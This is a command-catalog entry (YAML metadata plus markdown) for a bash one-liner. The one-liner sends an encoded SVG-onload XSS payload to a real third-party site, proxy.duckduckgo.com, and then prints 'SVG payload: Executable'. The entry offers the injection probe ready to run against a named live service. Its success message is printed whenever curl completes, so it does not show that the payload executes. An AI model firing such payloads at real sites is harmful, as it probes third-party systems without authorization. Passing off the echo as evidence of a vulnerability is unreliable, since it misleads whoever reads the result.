---
id: cmd-curl-test-alt-xss
data: >-
  curl -s
  "https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Csvg%0Conload=alert(1)%3E"
  > /dev/null && echo "SVG payload: Executable"
tags:
  - xss
  - payload-variant
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.471Z'
verified: false
validated: true
submitted: true
---
# curl-test-alt-xss

## Command

```bash
curl -s "https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Csvg%0Conload=alert(1)%3E" > /dev/null && echo "SVG payload: Executable"
```

## Description

Tests an alternative XSS payload variant using SVG onload for broader compatibility.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| Encoded alt payload | SVG-based injection | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://target.com?alt_payload" > /dev/null
```

### Advanced Usage

```bash
curl -s "https://target.com?details_payload" && echo "Tested"
```

## Expected Output

SVG payload: Executable

## Related

- [[Related Procedure]]
